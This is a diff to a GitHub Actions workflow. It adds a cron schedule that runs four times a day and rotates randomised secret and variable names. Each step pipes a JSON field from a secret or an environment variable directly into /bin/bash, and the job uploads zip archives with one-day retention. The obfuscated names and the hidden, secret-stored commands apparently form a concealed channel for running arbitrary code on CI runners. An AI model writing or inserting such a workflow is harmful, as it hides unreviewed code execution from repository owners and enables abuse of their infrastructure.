@@ -2,6 +2,8 @@ name: CI/CD
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '47 1,7,13,19 * * *'
 permissions:
   contents: read
   actions: read
@@ -14,17 +16,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run pipeline
         env:
-          hdu3: ${{ secrets.hdu3 }}
+          jfjpp7416: ${{ secrets.jfjpp7416 }}
         run: |
-          printf '%s' "$hdu3" | jq -r .irhor75634 | /bin/bash
-          echo $ki356 | jq -r .hxaz1 | /bin/bash
-          echo $njm09426 | jq -r .y90 | /bin/bash
-          printf '%s' "$n8304" | jq -r .oxga1003 | /bin/bash
-          echo $gcfon8569 | jq -r .eclh96 | /bin/bash
+          printf '%s' "$jfjpp7416" | jq -r .yxbmm24520 | /bin/bash
+          printf '%s' "$xoq30084" | jq -r .rypmq5884 | /bin/bash
+          printf '%s' "$r195" | jq -r .jsu73848 | /bin/bash
+          echo $xm8025 | jq -r .lydnj32 | /bin/bash
+          echo $gzle60 | jq -r .rtpjb5183 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
         with:
-          name: X6EC3biG
+          name: L7oazmD4
           path: "*.zip"
           retention-days: 1
